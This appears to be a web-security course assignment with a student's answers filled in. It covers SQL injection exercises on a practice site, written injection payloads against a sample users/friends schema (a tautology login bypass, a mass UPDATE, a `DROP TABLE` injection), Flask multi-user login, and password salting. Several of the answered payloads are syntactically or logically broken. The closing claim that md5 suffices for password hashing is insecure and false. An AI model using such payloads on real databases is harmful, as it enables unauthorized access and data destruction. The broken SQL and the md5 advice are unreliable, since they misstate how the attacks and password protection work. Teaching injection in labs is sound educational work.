## Questions

Come to class with the Python code for your multi-user Kanban board, and
make sure that your passwords are suitably protected.
You should also have your SQL injection attack code ready and be able to
explain how and why your attack will work.

You must be able to paste any part of your code into a poll response.

### 1. Try an SQL Injection Hack

It's time to give SQL Injection a shot using the `'' OR ''=''` SQL trick (which always returns True). Here's a hack to try at https://sqlzoo.net/hack/ to see if you can successfully gain access to a user's account.

1. Log in to the forum as "Jake" by passing "xxx" into the username and an SQL injection into the password.
2. (Optional) Acquire a user's password and then log into the main forum. Post something there as the user.

Walk through each of the tutorials to try to gain access to a user's account, then post something on the forum if you are able to!

### 2. Write an SQL injection
Assume the following tables exist:
```sqlite3
CREATE TABLE users (
    userid INT PRIMARY KEY,
    username TEXT,
    email TEXT,
    password TEXT
);
CREATE TABLE friends (
    friendid INT PRIMARY KEY,
    userid INT,
    name TEXT,
    phone DATETIME,
    age INT
);
```
And you have found the following two queries:
```python3
"SELECT userid FROM users WHERE username='" + uname + "' AND password='" + passwd + "';"
"SELECT name, phone, age FROM friends WHERE friendid = " + id + ";"
```
The webserver code will return an error if the first query returns a set of
results without a column called `id` that contains integers.  There will also be a
webserver error if the second query returns results without a column containing
`name` (of strings), a column containing `phone` (of strings), and `age` (of
integers).  If you're modifying or deleting things in the database then it
doesn't matter if the server raises an error, but if you'd like to see data
that's not meant for you then you need to make sure that the database doesn't
raise any errors.

Now do the following:
1. Write an attack which will list all the usernames and their passwords.  
```sqlite3
SELECT * FROM users WHERE name='' or '1'='1' and password='' or '1'='1'
```
2. Write an attack which will update the table so that every entry in the friends table has their userid set to 42.  (Hopefully this is the id of *your* account, and now everyone has to be friends with you.  Who said hackers were loners and never had any friends!)  
```sqlite3
UPDATE friends SET userid='42' WHERE username='' or '1'='1'
```

3. Write an attack which will drop both tables.  
```sqlite3
Tom'); DROP TABLE "users"."friends"; --
```
4. (Optional) If you didn't know the name or schema of the tables, then write an
SQL injection attack which will list all the tables.  Now write an attack which
will list all columns within a given table.

### 3. Multiple User Kanban

Extend your Kanban board from previous weeks to allow multiple users.  Each user should have their own username and password. For now assume that each user wants their own **private** board (i.e. there are no shared Kanban boards).
```python
from flask_login import LoginManager
from flask_login import current_user, login_user
from app.models import User

app = Flask(__name__)
login = LoginManager(app)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title='Sign In', form=form)
```

### 4. Secure the user passwords
If you used the example code from `requires_authorization.py` then you will see that usernames and passwords are stored directly in code, and passwords are stored as plain text. To solve this properly, you will need to:
- Store the user details in the database
- Do not store the password in the database, instead store a cryptographic hash of the password.
- Make sure that the password is salted, and that the salt is unique for each user. This helps significantly slows down intruders if they gain access to the usernames and password hashes.

To read more about salting passwords, consider reading:

Although for our purposes, a standard hash function like md5 will be sufficient and is already available in the standard Python libraries.
